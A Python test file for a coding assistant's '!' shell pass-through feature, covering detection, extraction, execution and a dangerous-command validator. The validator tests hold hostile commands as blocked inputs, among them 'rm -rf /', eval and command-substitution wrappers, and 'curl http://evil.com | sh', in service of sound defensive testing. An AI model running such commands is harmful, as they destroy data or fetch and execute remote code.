"""Tests for shell pass-through feature.

The `!` prefix allows users to run shell commands directly from the
Code Puppy prompt without any agent processing.
"""

import asyncio
from unittest.mock import AsyncMock, MagicMock, patch

from code_puppy.command_line.shell_passthrough import (
    _BANNER_NAME,
    SHELL_PASSTHROUGH_PREFIX,
    _format_banner,
    _validate_passthrough_command,
    execute_shell_passthrough,
    extract_command,
    is_shell_passthrough,
)


class TestIsShellPassthrough:
    """Test detection of shell pass-through input."""

    def test_simple_command(self):
        """A simple command like `!ls` is detected as pass-through."""
        assert is_shell_passthrough("!ls") is True

    def test_command_with_args(self):
        """Commands with arguments like `!ls -la` are detected."""
        assert is_shell_passthrough("!ls -la") is True

    def test_command_with_leading_whitespace(self):
        """Leading whitespace before `!` is tolerated."""
        assert is_shell_passthrough("  !git status") is True

    def test_command_with_trailing_whitespace(self):
        """Trailing whitespace after the command is tolerated."""
        assert is_shell_passthrough("!pwd  ") is True

    def test_complex_command(self):
        """Complex commands with pipes are detected."""
        assert is_shell_passthrough("!cat file.txt | grep 'hello'") is True

    def test_bare_bang_is_not_passthrough(self):
        """A lone `!` with nothing after it should NOT be a pass-through."""
        assert is_shell_passthrough("!") is False

    def test_bang_with_only_whitespace_is_not_passthrough(self):
        """A `!` followed by only whitespace is NOT a pass-through."""
        assert is_shell_passthrough("!   ") is False

    def test_empty_string(self):
        """An empty string is NOT a pass-through."""
        assert is_shell_passthrough("") is False

    def test_regular_prompt(self):
        """Regular text without `!` prefix is NOT a pass-through."""
        assert is_shell_passthrough("write me a python script") is False

    def test_slash_command(self):
        """Slash commands like `/help` are NOT pass-throughs."""
        assert is_shell_passthrough("/help") is False

    def test_bang_in_middle_of_text(self):
        """A `!` in the middle of text is NOT a pass-through."""
        assert is_shell_passthrough("hello! world") is False

    def test_prefix_constant(self):
        """Verify the prefix constant is `!`."""
        assert SHELL_PASSTHROUGH_PREFIX == "!"


class TestExtractCommand:
    """Test command extraction from pass-through input."""

    def test_simple_command(self):
        """Extract a simple command from `!ls`."""
        assert extract_command("!ls") == "ls"

    def test_command_with_args(self):
        """Extract a command with arguments."""
        assert extract_command("!git status") == "git status"

    def test_strips_surrounding_whitespace(self):
        """Surrounding whitespace is stripped from both prefix and command."""
        assert extract_command("  !  pwd  ") == "pwd"

    def test_preserves_inner_whitespace(self):
        """Whitespace within the command itself is preserved."""
        assert extract_command("!echo  hello   world") == "echo  hello   world"

    def test_pipe_command(self):
        """Commands with pipes are extracted correctly."""
        assert extract_command("!ls | head -5") == "ls | head -5"

    def test_complex_command(self):
        """Complex commands with special chars are extracted verbatim."""
        assert extract_command("!find . -name '*.py' -exec wc -l {} +") == (
            "find . -name '*.py' -exec wc -l {} +"
        )


class TestFormatBanner:
    """Test banner formatting."""

    def test_banner_uses_config_color(self):
        """Banner should use the color from get_banner_color."""
        with patch(
            "code_puppy.command_line.shell_passthrough.get_banner_color",
            return_value="medium_sea_green",
        ):
            banner = _format_banner()
            assert "medium_sea_green" in banner
            assert "SHELL PASSTHROUGH" in banner

    def test_banner_name_constant(self):
        """Verify the banner name matches what config.py expects."""
        assert _BANNER_NAME == "shell_passthrough"

    def test_banner_matches_rich_renderer_pattern(self):
        """Banner format should match [bold white on {color}] pattern."""
        with patch(
            "code_puppy.command_line.shell_passthrough.get_banner_color",
            return_value="red",
        ):
            banner = _format_banner()
            assert "[bold white on red]" in banner
            assert "[/bold white on red]" in banner


class TestExecuteShellPassthrough:
    """Test shell command execution."""

    def _mock_console(self):
        """Create a mock Rich Console for capturing print calls."""
        return MagicMock()

    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    @patch("code_puppy.command_line.shell_passthrough._get_console")
    def test_successful_command(self, mock_get_console, mock_run):
        """Successful commands show a success message."""
        console = self._mock_console()
        mock_get_console.return_value = console
        mock_run.return_value = MagicMock(returncode=0)

        execute_shell_passthrough("!echo hello")

        mock_run.assert_called_once()
        call_kwargs = mock_run.call_args
        assert call_kwargs[1]["shell"] is True
        assert call_kwargs[0][0] == "echo hello"

        # Should have printed banner, context line, and success
        assert console.print.call_count == 3
        last_call = str(console.print.call_args_list[-1])
        assert "Done" in last_call

    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    @patch("code_puppy.command_line.shell_passthrough._get_console")
    def test_failed_command_shows_exit_code(self, mock_get_console, mock_run):
        """Non-zero exit codes show the exit code."""
        console = self._mock_console()
        mock_get_console.return_value = console
        mock_run.return_value = MagicMock(returncode=1)

        execute_shell_passthrough("!false")

        last_call = str(console.print.call_args_list[-1])
        assert "Exit code 1" in last_call

    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    @patch("code_puppy.command_line.shell_passthrough._get_console")
    def test_exit_code_127(self, mock_get_console, mock_run):
        """Exit code 127 (command not found) is reported properly."""
        console = self._mock_console()
        mock_get_console.return_value = console
        mock_run.return_value = MagicMock(returncode=127)

        execute_shell_passthrough("!nonexistentcommand")

        last_call = str(console.print.call_args_list[-1])
        assert "127" in last_call

    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    @patch("code_puppy.command_line.shell_passthrough._get_console")
    def test_keyboard_interrupt(self, mock_get_console, mock_run):
        """Ctrl+C during execution shows interrupted message."""
        console = self._mock_console()
        mock_get_console.return_value = console
        mock_run.side_effect = KeyboardInterrupt()

        execute_shell_passthrough("!sleep 999")

        last_call = str(console.print.call_args_list[-1])
        assert "Interrupted" in last_call

    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    @patch("code_puppy.command_line.shell_passthrough._get_console")
    def test_generic_exception(self, mock_get_console, mock_run):
        """Generic exceptions are caught and reported."""
        console = self._mock_console()
        mock_get_console.return_value = console
        mock_run.side_effect = OSError("permission denied")

        execute_shell_passthrough("!forbidden")

        last_call = str(console.print.call_args_list[-1])
        assert "permission denied" in last_call

    @patch("code_puppy.command_line.shell_passthrough._get_console")
    def test_empty_command_after_bang(self, mock_get_console):
        """An empty command (just spaces after !) shows usage hint."""
        console = self._mock_console()
        mock_get_console.return_value = console

        execute_shell_passthrough("!")

        console.print.assert_called_once()
        call_arg = str(console.print.call_args)
        assert "Usage" in call_arg or "Empty" in call_arg

    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    @patch("code_puppy.command_line.shell_passthrough._get_console")
    def test_inherits_stdio(self, mock_get_console, mock_run):
        """Command should inherit stdin/stdout/stderr from parent."""
        import sys

        console = self._mock_console()
        mock_get_console.return_value = console
        mock_run.return_value = MagicMock(returncode=0)

        execute_shell_passthrough("!echo hello")

        call_kwargs = mock_run.call_args[1]
        assert call_kwargs["stdin"] is sys.stdin
        assert call_kwargs["stdout"] is sys.stdout
        assert call_kwargs["stderr"] is sys.stderr

    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    @patch("code_puppy.command_line.shell_passthrough._get_console")
    @patch("code_puppy.command_line.shell_passthrough.os.getcwd", return_value="/tmp")
    def test_uses_current_working_directory(self, mock_cwd, mock_get_console, mock_run):
        """Command should run in the current working directory."""
        console = self._mock_console()
        mock_get_console.return_value = console
        mock_run.return_value = MagicMock(returncode=0)

        execute_shell_passthrough("!ls")

        call_kwargs = mock_run.call_args[1]
        assert call_kwargs["cwd"] == "/tmp"

    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    @patch("code_puppy.command_line.shell_passthrough._get_console")
    def test_banner_shown_before_command(self, mock_get_console, mock_run):
        """The banner should display with SHELL PASSTHROUGH label."""
        console = self._mock_console()
        mock_get_console.return_value = console
        mock_run.return_value = MagicMock(returncode=0)

        execute_shell_passthrough("!git status")

        first_call = str(console.print.call_args_list[0])
        assert "SHELL PASSTHROUGH" in first_call
        assert "git status" in first_call

    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    @patch("code_puppy.command_line.shell_passthrough._get_console")
    def test_context_hint_shown(self, mock_get_console, mock_run):
        """A context line should clarify this bypasses the agent."""
        console = self._mock_console()
        mock_get_console.return_value = console
        mock_run.return_value = MagicMock(returncode=0)

        execute_shell_passthrough("!echo hi")

        second_call = str(console.print.call_args_list[1])
        assert "Direct shell" in second_call
        assert "safety checks" in second_call

    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    @patch("code_puppy.command_line.shell_passthrough._get_console")
    def test_rich_markup_escaped_in_command(self, mock_get_console, mock_run):
        """Commands with Rich markup chars should be escaped to prevent injection."""
        console = self._mock_console()
        mock_get_console.return_value = console
        mock_run.return_value = MagicMock(returncode=0)

        execute_shell_passthrough("!echo [bold red]oops[/bold red]")

        assert mock_run.call_args[0][0] == "echo [bold red]oops[/bold red]"

    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    @patch("code_puppy.command_line.shell_passthrough._get_console")
    def test_rich_markup_escaped_in_error(self, mock_get_console, mock_run):
        """Error messages with Rich markup chars should be escaped."""
        console = self._mock_console()
        mock_get_console.return_value = console
        mock_run.side_effect = OSError("[red]bad[/red]")

        execute_shell_passthrough("!broken")

        last_call = str(console.print.call_args_list[-1])
        assert "Shell error" in last_call


class TestInitialCommandPassthrough:
    """Test that shell passthrough works for initial_command and -p paths.

    Regression tests for the bug where `code-puppy "!ls"` or
    `code-puppy -p "!ls"` would send the command to the AI agent
    instead of executing it directly in the shell.

    Also covers interactive_mode(initial_command=...) as a separate
    entry point that must honour the same passthrough guarantee.
    """

    @patch("code_puppy.command_line.shell_passthrough._get_console")
    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    def test_interactive_mode_initial_command_calls_passthrough(
        self, mock_run, mock_get_console
    ):
        """interactive_mode with initial_command='!ls -la' should execute shell, not agent.

        The passthrough check fires before any agent code is reached, so
        run_prompt_with_attachments must never be invoked.
        """
        from code_puppy.cli_runner import interactive_mode

        mock_get_console.return_value = MagicMock()
        mock_run.return_value = MagicMock(returncode=0)
        mock_renderer = MagicMock()
        mock_renderer.console = MagicMock()

        mock_agent = MagicMock()
        mock_agent.get_user_prompt.return_value = "Enter task:"

        with (
            patch("code_puppy.interactive_loop.print_truecolor_warning"),
            patch(
                "code_puppy.interactive_loop.get_cancel_agent_display_name",
                return_value="Ctrl+C",
            ),
            patch("code_puppy.messaging.emit_system_message"),
            patch("code_puppy.messaging.emit_info"),
            patch("code_puppy.messaging.emit_success"),
            patch("code_puppy.messaging.emit_warning"),
            patch("code_puppy.command_line.motd.print_motd"),
            patch(
                "code_puppy.agents.agent_manager.get_current_agent",
                return_value=mock_agent,
            ),
            patch(
                "code_puppy.interactive_loop.run_prompt_with_attachments",
                new_callable=AsyncMock,
            ) as mock_run_prompt,
            patch(
                "code_puppy.command_line.prompt_toolkit_completion.get_input_with_combined_completion",
                side_effect=EOFError,
            ),
        ):
            asyncio.run(interactive_mode(mock_renderer, initial_command="!ls -la"))

            # Shell command should have been executed via subprocess
            mock_run.assert_called_once()
            assert mock_run.call_args[0][0] == "ls -la"
            # Agent processing must NOT have been triggered
            mock_run_prompt.assert_not_called()

    @patch("code_puppy.command_line.shell_passthrough._get_console")
    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    def test_execute_single_prompt_calls_passthrough(self, mock_run, mock_console):
        """execute_single_prompt with '!ls' should run shell, not the agent."""
        from code_puppy.cli_runner import execute_single_prompt

        mock_console.return_value = MagicMock()
        mock_run.return_value = MagicMock(returncode=0)
        mock_renderer = MagicMock()
        mock_renderer.console = MagicMock()

        with (
            patch("code_puppy.prompt_runner.get_current_agent") as mock_agent,
            patch(
                "code_puppy.prompt_runner.run_prompt_with_attachments"
            ) as mock_run_prompt,
        ):
            asyncio.run(execute_single_prompt("!ls -la", mock_renderer))

            # Shell command should have been executed
            mock_run.assert_called_once()
            assert mock_run.call_args[0][0] == "ls -la"
            # Agent should NOT have been called
            mock_agent.assert_not_called()
            mock_run_prompt.assert_not_called()

    @patch("code_puppy.command_line.shell_passthrough._get_console")
    @patch("code_puppy.command_line.shell_passthrough.subprocess.run")
    def test_execute_single_prompt_normal_prompt_skips_passthrough(
        self, mock_run, mock_console
    ):
        """execute_single_prompt with normal text should NOT call passthrough."""
        from code_puppy.cli_runner import execute_single_prompt

        mock_renderer = MagicMock()
        mock_renderer.console = MagicMock()

        mock_response = MagicMock()
        mock_response.output = "Hello!"
        mock_response.all_messages.return_value = []

        with (
            patch("code_puppy.prompt_runner.get_current_agent"),
            patch(
                "code_puppy.prompt_runner.run_prompt_with_attachments",
                new_callable=AsyncMock,
                return_value=(mock_response, None),
            ),
            patch("code_puppy.messaging.get_message_bus"),
            patch("code_puppy.messaging.message_queue.emit_info"),
        ):
            asyncio.run(execute_single_prompt("write me a script", mock_renderer))

            # Shell passthrough should NOT have been called
            mock_run.assert_not_called()


class TestValidatePassthroughCommand:
    """Test validation of dangerous command patterns.

    These tests verify that the shell_passthrough security validation
    correctly blocks dangerous patterns while allowing benign commands.
    """

    def test_eval_with_quotes_blocked(self):
        """`eval "rm -rf /"` should be blocked as dangerous."""
        is_safe, reason = _validate_passthrough_command('eval "rm -rf /"')
        assert is_safe is False
        assert "Dangerous pattern detected" in reason

    def test_backtick_substitution_blocked(self):
        """Backtick command substitution like `rm -rf /` should be blocked."""
        is_safe, reason = _validate_passthrough_command("echo `rm -rf /`")
        assert is_safe is False
        assert "Dangerous pattern detected" in reason

    def test_dollar_paren_substitution_blocked(self):
        """$(cmd) command substitution like $(rm -rf /) should be blocked."""
        is_safe, reason = _validate_passthrough_command("echo $(rm -rf /)")
        assert is_safe is False
        assert "Dangerous pattern detected" in reason

    def test_ls_benign_passes(self):
        """Benign commands like `ls -la` should pass validation."""
        is_safe, reason = _validate_passthrough_command("ls -la")
        assert is_safe is True
        assert reason == ""

    def test_git_status_benign_passes(self):
        """Benign commands like `git status` should pass validation."""
        is_safe, reason = _validate_passthrough_command("git status")
        assert is_safe is True
        assert reason == ""

    def test_pipe_benign_passes(self):
        """Benign piped commands like `cat file.txt | grep foo` should pass."""
        is_safe, reason = _validate_passthrough_command("cat file.txt | grep foo")
        assert is_safe is True
        assert reason == ""

    def test_evaluate_method_not_blocked(self):
        """`something.evaluate(x)` should NOT be blocked (false-positive fix).

        The pattern should only match the standalone 'eval' command,
        not words that contain 'eval' as a substring like 'evaluate'.
        """
        is_safe, reason = _validate_passthrough_command("something.evaluate(x)")
        assert is_safe is True, f"evaluate() should not be blocked, got: {reason}"
        assert reason == ""

    def test_eval_function_call_blocked(self):
        """`eval(some_code)` should still be blocked."""
        is_safe, reason = _validate_passthrough_command("eval(some_code)")
        assert is_safe is False
        assert "Dangerous pattern detected" in reason

    def test_eval_with_single_quotes_blocked(self):
        """`eval 'rm -rf /'` should be blocked."""
        is_safe, reason = _validate_passthrough_command("eval 'rm -rf /'")
        assert is_safe is False
        assert "Dangerous pattern detected" in reason

    def test_empty_command_rejected(self):
        """Empty command should be rejected."""
        is_safe, reason = _validate_passthrough_command("")
        assert is_safe is False
        assert "Empty command" in reason

    def test_whitespace_only_command_rejected(self):
        """Whitespace-only command should be rejected."""
        is_safe, reason = _validate_passthrough_command("   ")
        assert is_safe is False
        assert "Empty command" in reason

    def test_command_too_long_rejected(self):
        """Commands exceeding MAX_COMMAND_LENGTH should be rejected."""
        long_command = "x" * 9000  # Exceeds 8192 limit
        is_safe, reason = _validate_passthrough_command(long_command)
        assert is_safe is False
        assert "Command too long" in reason

    def test_rm_rf_root_blocked(self):
        """`rm -rf /` should be blocked as destructive."""
        is_safe, reason = _validate_passthrough_command("rm -rf /")
        assert is_safe is False
        assert "Dangerous pattern detected" in reason

    def test_curl_pipe_sh_blocked(self):
        """`curl http://evil.com | sh` should be blocked."""
        is_safe, reason = _validate_passthrough_command("curl http://evil.com | sh")
        assert is_safe is False
        assert "Dangerous pattern detected" in reason
